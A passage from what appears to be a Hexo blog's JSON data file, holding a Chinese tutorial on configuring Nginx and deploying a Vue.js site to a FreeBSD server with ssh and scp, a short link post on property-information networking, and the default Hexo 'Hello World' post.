class=\"headerlink\" title=\"nginx 配置静态资源\"></a>nginx 配置静态资源</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">       listen       4000;</span><br><span class=\"line\">       server_name  www.test.com;</span><br><span class=\"line\">       charset utf-8;</span><br><span class=\"line\">       index /static/index.html;//配置首页</span><br><span class=\"line\"></span><br><span class=\"line\">       //这边可使用正则表达式,拦截动态数据的请求,从而解决跨域问题</span><br><span class=\"line\">       location = /sellingJson.html &#123;</span><br><span class=\"line\">          proxy_pass http://192.168.100.17:8090/vueHelpSellingcar.html;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       #配置Nginx动静分离，定义的静态页面直接从static读取。</span><br><span class=\"line\">      location ~ .*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ </span><br><span class=\"line\">      &#123; </span><br><span class=\"line\">       root /static/;</span><br><span class=\"line\">       #expires定义用户浏览器缓存的时间为7天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力</span><br><span class=\"line\">       expires      7d; </span><br><span class=\"line\">      &#125;    </span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/qq_26026975/article/details/75331779\" target=\"_blank\" rel=\"noopener\">推荐阅读</a></p>\n<hr>\n<h2 id=\"部署操作\"><a href=\"#部署操作\" class=\"headerlink\" title=\"部署操作\"></a>部署操作</h2><h3 id=\"Linux-Scp命令\"><a href=\"#Linux-Scp命令\" class=\"headerlink\" title=\"Linux Scp命令\"></a><strong>Linux Scp命令</strong></h3><p> secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。</p>\n<h3 id=\"sudo-su-使用管理员权限\"><a href=\"#sudo-su-使用管理员权限\" class=\"headerlink\" title=\"sudo su 使用管理员权限\"></a><code>sudo su</code> 使用管理员权限</h3><h3 id=\"创建登录脚本\"><a href=\"#创建登录脚本\" class=\"headerlink\" title=\"创建登录脚本\"></a><strong>创建登录脚本</strong></h3><p> cd /usr/local/bin/<br> mkdir login<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">ssh root@47.104.231.254</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"创建文件上脚本\"><a href=\"#创建文件上脚本\" class=\"headerlink\" title=\"创建文件上脚本\"></a><strong>创建文件上脚本</strong></h3> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">scp -r /mnt/d/Project/shrs/dist/* root@47.104.231.254:/mnt/www/shrs2006.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"sudo-su-管理员权限运行\"><a href=\"#sudo-su-管理员权限运行\" class=\"headerlink\" title=\"sudo su 管理员权限运行\"></a><a href=\"https://blog.csdn.net/guoweimelon/article/details/50471561\" target=\"_blank\" rel=\"noopener\">sudo su 管理员权限运行</a></h3><p> chmod a+x file-name <a href=\"http://man.linuxde.net/chmod\" target=\"_blank\" rel=\"noopener\">提升权限</a></p>\n<h3 id=\"第一步-使用pkg包管理工具搜索-安装Nginx\"><a href=\"#第一步-使用pkg包管理工具搜索-安装Nginx\" class=\"headerlink\" title=\"第一步 使用pkg包管理工具搜索/安装Nginx\"></a><strong>第一步 使用pkg包管理工具<code>搜索/安装</code>Nginx</strong></h3><p> FreeBSD 安装 NGINX  // done<br> FreeBSD 下 <code>pkg</code> 包管理工具<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pkg search pkgName // 搜索</span><br><span class=\"line\">pkg install pkgName[必须是完整名称，可以先search关键字，后复制全称安装]</span><br></pre></td></tr></table></figure></p>\n<p> Nginx 安装完成后<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable nginx // 设置开机启动 注意版本，在主流Linux版本下有效 as Ubuntu、CentOS</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第二步-启动后台服务\"><a href=\"#第二步-启动后台服务\" class=\"headerlink\" title=\"第二步 启动后台服务\"></a><strong>第二步 启动后台服务</strong></h3><p> 作为后台服务 启动服务<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nginx onestart</span><br><span class=\"line\">service nginx onerestart</span><br><span class=\"line\">service nginx onestop</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Nginx总配置文件目录\"><a href=\"#Nginx总配置文件目录\" class=\"headerlink\" title=\"Nginx总配置文件目录\"></a>Nginx总配置文件目录</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/etc/nginx</span><br><span class=\"line\"></span><br><span class=\"line\">gzip  on;</span><br><span class=\"line\">    include /mnt/www/etc/nginx/*.conf;    # !* import</span><br></pre></td></tr></table></figure>\n<h4 id=\"分配置文件\"><a href=\"#分配置文件\" class=\"headerlink\" title=\"分配置文件\"></a>分配置文件</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\">        server_name localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        default_type &apos;text/html&apos;;</span><br><span class=\"line\">        charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">                root /mnt/www/shrs2006.com;</span><br><span class=\"line\">                index index.html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>配置Nginx</strong></p>\n<p>1.总配置文件，加分配至文件目录。虚拟主机 /usr/local/etc/nginx</p>\n<p>2.分配置文件 以<code>域名</code>命名  <code>/mnt/www/etc/nginx/shrs2006.com.conf</code> // 一个网站 对应一个配置文件</p>\n<h3 id=\"调试，修改host文件\"><a href=\"#调试，修改host文件\" class=\"headerlink\" title=\"调试，修改host文件\"></a>调试，修改host文件</h3><ol>\n<li>C:\\Windows\\System32\\drivers\\etc</li>\n<li>修改host (<a href=\"https://jingyan.baidu.com/article/624e7459b194f134e8ba5a8e.html\" target=\"_blank\" rel=\"noopener\">host修改权限</a>)</li>\n<li><a href=\"https://jingyan.baidu.com/article/5bbb5a1b15c97c13eba1798a.html\" target=\"_blank\" rel=\"noopener\">修改host</a></li>\n</ol>\n<p>绑定假域名</p>\n<p>www.shrs2006.test =&gt; IP windows hosts</p>\n<p>host文件:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">47.104.231.254          www.shrs2006.test // 末尾加入字段</span><br></pre></td></tr></table></figure></p>\n<p>// done</p>\n<h3 id=\"第三步-上传-项目文件\"><a href=\"#第三步-上传-项目文件\" class=\"headerlink\" title=\"第三步 上传 项目文件\"></a>第三步 上传 项目文件</h3><p>scp 脚本 项目生成后dist文件夹 上传指定目录下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt/www/shrs2006.com</span><br><span class=\"line\"></span><br><span class=\"line\">scp /mnt/d/Project/shrs/dist root@47.104.231.254:/mnt/www/shrs2006.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h3><p>访问 网址 检测是否部署成功</p>\n<p>重启服务器，打开假域名、可以看到网站 算成功。</p>\n<h3 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h3><p>重启 Nginx 服务<br><a href=\"https://www.cnblogs.com/zhj5551/p/7589078.html\" target=\"_blank\" rel=\"noopener\">命令</a></p>\n<p>并且要求 开机启动 <a href=\"https://www.ezloo.com/2009/05/linux_poweroff_and_reboot.html\" target=\"_blank\" rel=\"noopener\">Linux的关机与重启命令</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Nginx-Vue-js实现前后端分离\"><a href=\"#Nginx-Vue-js实现前后端分离\" class=\"headerlink\" title=\"Nginx+Vue.js实现前后端分离\"></a>Nginx+Vue.js实现前后端分离</h2><h3 id=\"1-nginx-是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理\"><a href=\"#1-nginx-是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理\" class=\"headerlink\" title=\"1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.\"></a>1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.</h3><h3 id=\"2-Es6学习地址\"><a href=\"#2-Es6学习地址\" class=\"headerlink\" title=\"2.Es6学习地址\"></a>2.<a href=\"http://es6.ruanyifeng.com/\" target=\"_blank\" rel=\"noopener\">Es6学习地址</a></h3><h3 id=\"3-vue-js是一款前端模板渲染引擎-类似于后端的jsp-beetl等模板引擎-当然结合node环境也可作为后端渲染用-官网已支持\"><a href=\"#3-vue-js是一款前端模板渲染引擎-类似于后端的jsp-beetl等模板引擎-当然结合node环境也可作为后端渲染用-官网已支持\" class=\"headerlink\" title=\"3.vue.js是一款前端模板渲染引擎,类似于后端的jsp,beetl等模板引擎.当然结合node环境也可作为后端渲染用.(官网已支持)\"></a>3.vue.js是一款前端<code>模板渲染引擎</code>,类似于后端的<code>jsp</code>,<code>beetl</code>等<code>模板引擎</code>.当然结合node环境也可作为后端渲染用.(官网已支持)</h3><h2 id=\"说了上述几点-让我们来回答几个为什么\"><a href=\"#说了上述几点-让我们来回答几个为什么\" class=\"headerlink\" title=\"说了上述几点,让我们来回答几个为什么?\"></a>说了上述几点,让我们来回答几个为什么?</h2><p>1.实现前后端分离的好处是什么?主要应用场景在哪?</p>\n<p>2.为什么有了后端模板引擎,为什么还要用前端的模板引擎?他们的优势和劣势? </p>\n<p>3.实现前后端分离需要怎么改？</p>\n<p>  答：</p>\n<p>  1.首先是发展的眼光看问题，以前的项目大多呈现的是PC端项目,且场景简单,固定.请求大多是有状态的.而现在我们常常是移动端项目较多,同一款app大多是原生和内嵌页面相结合的方式.并且现在的项目场景更多元化,这导致一个功能模块很可能是好几个项目的请求共同作用的结果.</p>\n<p>  2.如果还按照以前的做法,第一个问题是我只能用jsonp去解决调多个跨域请求的问题,实现起来代码太过冗余。对于同一功能,很有可能app端和PC端就有两套不同的写法。并且带宽是个很贵的东西,客户端总是去服务器端一起静态资源的请求,会导致速度慢。动静分离可以实现静态资源和动态资源分开获取,并且服务器也能动静分离,有效解决带宽问题。</p>\n<p>  3.后端开发人员对于css,js的掌握可能不如前端熟练,比如利用jsp填充数据时,往往需要后端开发人员去调样式和写js,这样会造成开发效率低下。</p>\n<p>  4.采用前端模板渲染可以释放服务器端的一部分压力,并且前端模板引擎支持的功能比后端丰富.比如用vue可以自定义组件,校验方式,深入式渐变等,这比后端模板引擎功能要更加丰富.</p>\n<hr>\n<h2 id=\"nginx-配置静态资源\"><a href=\"#nginx-配置静态资源\" class=\"headerlink\" title=\"nginx 配置静态资源\"></a>nginx 配置静态资源</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">       listen       4000;</span><br><span class=\"line\">       server_name  www.test.com;</span><br><span class=\"line\">       charset utf-8;</span><br><span class=\"line\">       index /static/index.html;//配置首页</span><br><span class=\"line\"></span><br><span class=\"line\">       //这边可使用正则表达式,拦截动态数据的请求,从而解决跨域问题</span><br><span class=\"line\">       location = /sellingJson.html &#123;</span><br><span class=\"line\">          proxy_pass http://192.168.100.17:8090/vueHelpSellingcar.html;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       #配置Nginx动静分离，定义的静态页面直接从static读取。</span><br><span class=\"line\">      location ~ .*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ </span><br><span class=\"line\">      &#123; </span><br><span class=\"line\">       root /static/;</span><br><span class=\"line\">       #expires定义用户浏览器缓存的时间为7天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力</span><br><span class=\"line\">       expires      7d; </span><br><span class=\"line\">      &#125;    </span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/qq_26026975/article/details/75331779\" target=\"_blank\" rel=\"noopener\">推荐阅读</a></p>\n<hr>\n<h2 id=\"部署操作\"><a href=\"#部署操作\" class=\"headerlink\" title=\"部署操作\"></a>部署操作</h2><h3 id=\"Linux-Scp命令\"><a href=\"#Linux-Scp命令\" class=\"headerlink\" title=\"Linux Scp命令\"></a><strong>Linux Scp命令</strong></h3><p> secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。</p>\n<h3 id=\"sudo-su-使用管理员权限\"><a href=\"#sudo-su-使用管理员权限\" class=\"headerlink\" title=\"sudo su 使用管理员权限\"></a><code>sudo su</code> 使用管理员权限</h3><h3 id=\"创建登录脚本\"><a href=\"#创建登录脚本\" class=\"headerlink\" title=\"创建登录脚本\"></a><strong>创建登录脚本</strong></h3><p> cd /usr/local/bin/<br> mkdir login<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">ssh root@47.104.231.254</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"创建文件上脚本\"><a href=\"#创建文件上脚本\" class=\"headerlink\" title=\"创建文件上脚本\"></a><strong>创建文件上脚本</strong></h3> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">scp -r /mnt/d/Project/shrs/dist/* root@47.104.231.254:/mnt/www/shrs2006.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"sudo-su-管理员权限运行\"><a href=\"#sudo-su-管理员权限运行\" class=\"headerlink\" title=\"sudo su 管理员权限运行\"></a><a href=\"https://blog.csdn.net/guoweimelon/article/details/50471561\" target=\"_blank\" rel=\"noopener\">sudo su 管理员权限运行</a></h3><p> chmod a+x file-name <a href=\"http://man.linuxde.net/chmod\" target=\"_blank\" rel=\"noopener\">提升权限</a></p>\n<h3 id=\"第一步-使用pkg包管理工具搜索-安装Nginx\"><a href=\"#第一步-使用pkg包管理工具搜索-安装Nginx\" class=\"headerlink\" title=\"第一步 使用pkg包管理工具搜索/安装Nginx\"></a><strong>第一步 使用pkg包管理工具<code>搜索/安装</code>Nginx</strong></h3><p> FreeBSD 安装 NGINX  // done<br> FreeBSD 下 <code>pkg</code> 包管理工具<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pkg search pkgName // 搜索</span><br><span class=\"line\">pkg install pkgName[必须是完整名称，可以先search关键字，后复制全称安装]</span><br></pre></td></tr></table></figure></p>\n<p> Nginx 安装完成后<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable nginx // 设置开机启动 注意版本，在主流Linux版本下有效 as Ubuntu、CentOS</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第二步-启动后台服务\"><a href=\"#第二步-启动后台服务\" class=\"headerlink\" title=\"第二步 启动后台服务\"></a><strong>第二步 启动后台服务</strong></h3><p> 作为后台服务 启动服务<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nginx onestart</span><br><span class=\"line\">service nginx onerestart</span><br><span class=\"line\">service nginx onestop</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Nginx总配置文件目录\"><a href=\"#Nginx总配置文件目录\" class=\"headerlink\" title=\"Nginx总配置文件目录\"></a>Nginx总配置文件目录</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/etc/nginx</span><br><span class=\"line\"></span><br><span class=\"line\">gzip  on;</span><br><span class=\"line\">    include /mnt/www/etc/nginx/*.conf;    # !* import</span><br></pre></td></tr></table></figure>\n<h4 id=\"分配置文件\"><a href=\"#分配置文件\" class=\"headerlink\" title=\"分配置文件\"></a>分配置文件</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\">        server_name localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        default_type &apos;text/html&apos;;</span><br><span class=\"line\">        charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">                root /mnt/www/shrs2006.com;</span><br><span class=\"line\">                index index.html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>配置Nginx</strong></p>\n<p>1.总配置文件，加分配至文件目录。虚拟主机 /usr/local/etc/nginx</p>\n<p>2.分配置文件 以<code>域名</code>命名  <code>/mnt/www/etc/nginx/shrs2006.com.conf</code> // 一个网站 对应一个配置文件</p>\n<h3 id=\"调试，修改host文件\"><a href=\"#调试，修改host文件\" class=\"headerlink\" title=\"调试，修改host文件\"></a>调试，修改host文件</h3><ol>\n<li>C:\\Windows\\System32\\drivers\\etc</li>\n<li>修改host (<a href=\"https://jingyan.baidu.com/article/624e7459b194f134e8ba5a8e.html\" target=\"_blank\" rel=\"noopener\">host修改权限</a>)</li>\n<li><a href=\"https://jingyan.baidu.com/article/5bbb5a1b15c97c13eba1798a.html\" target=\"_blank\" rel=\"noopener\">修改host</a></li>\n</ol>\n<p>绑定假域名</p>\n<p>www.shrs2006.test =&gt; IP windows hosts</p>\n<p>host文件:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">47.104.231.254          www.shrs2006.test // 末尾加入字段</span><br></pre></td></tr></table></figure></p>\n<p>// done</p>\n<h3 id=\"第三步-上传-项目文件\"><a href=\"#第三步-上传-项目文件\" class=\"headerlink\" title=\"第三步 上传 项目文件\"></a>第三步 上传 项目文件</h3><p>scp 脚本 项目生成后dist文件夹 上传指定目录下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt/www/shrs2006.com</span><br><span class=\"line\"></span><br><span class=\"line\">scp /mnt/d/Project/shrs/dist root@47.104.231.254:/mnt/www/shrs2006.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h3><p>访问 网址 检测是否部署成功</p>\n<p>重启服务器，打开假域名、可以看到网站 算成功。</p>\n<h3 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h3><p>重启 Nginx 服务<br><a href=\"https://www.cnblogs.com/zhj5551/p/7589078.html\" target=\"_blank\" rel=\"noopener\">命令</a></p>\n<p>并且要求 开机启动 <a href=\"https://www.ezloo.com/2009/05/linux_poweroff_and_reboot.html\" target=\"_blank\" rel=\"noopener\">Linux的关机与重启命令</a></p>\n"},{"title":"不动产信息全国联网！下一步房产税","date":"2018-06-25T10:34:46.000Z","_content":"[不动产信息全国联网实现了！下一步仅是房产税？](https://zhidao.baidu.com/daily/view?id=131400)","source":"_posts/不动产信息全国联网！下一步房产税.md","raw":"---\ntitle: 不动产信息全国联网！下一步房产税\ndate: 2018-06-25 18:34:46\ntags:\ncategories:\n---\n[不动产信息全国联网实现了！下一步仅是房产税？](https://zhidao.baidu.com/daily/view?id=131400)","slug":"不动产信息全国联网！下一步房产税","published":1,"updated":"2018-06-25T10:35:28.532Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i26r0004b8xj6uajnsl6","content":"<p><a href=\"https://zhidao.baidu.com/daily/view?id=131400\" target=\"_blank\" rel=\"noopener\">不动产信息全国联网实现了！下一步仅是房产税？</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://zhidao.baidu.com/daily/view?id=131400\" target=\"_blank\" rel=\"noopener\">不动产信息全国联网实现了！下一步仅是房产税？</a></p>\n"},{"title":"Hello World","date":"2014-10-01T07:21:11.000Z","archives":null,"_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2014-10-1 15:21:11\ntags: \narchives: \ncategories: \n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","slug":"hello-world","published":1,"updated":"2018-05-09T06:29:03.842Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i26s0005b8xjk3pgvxf5","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" 